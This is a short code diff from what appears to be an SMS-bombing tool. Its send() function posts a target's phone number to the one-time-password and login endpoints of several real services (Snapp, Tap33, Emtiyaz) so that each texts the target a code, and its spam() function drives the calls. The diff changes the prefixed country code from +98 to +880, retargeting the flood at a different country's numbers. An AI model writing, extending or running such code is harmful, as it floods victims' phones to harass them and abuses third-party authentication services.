@@ -16,7 +16,7 @@ def send(cellphone):
     # 1. snap otp [OK]
     http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
         headers={'Content-Type': 'application/json'},
-        body=dumps({"cellphone": f"+98{cellphone}"}).encode())
+        body=dumps({"cellphone": f"+880{cellphone}"}).encode())
     
     # 2. tap33 otp [OK]
     http.request("post", "https://tap33.me/api/v2/user",
@@ -46,7 +46,7 @@ def send(cellphone):
     # 8. emtiaz [OK]
     http.request("post", "https://web.emtiyaz.app/json/login",
      headers={'Content-Type': 'application/json'},
-      body=dumps({"phone": f'+98{cellphone}'}).encode())
+      body=dumps({"phone": f'+880{cellphone}'}).encode())
 
 def spam(args):
     if (search(r'9\d{9}$', args.cellphone)):
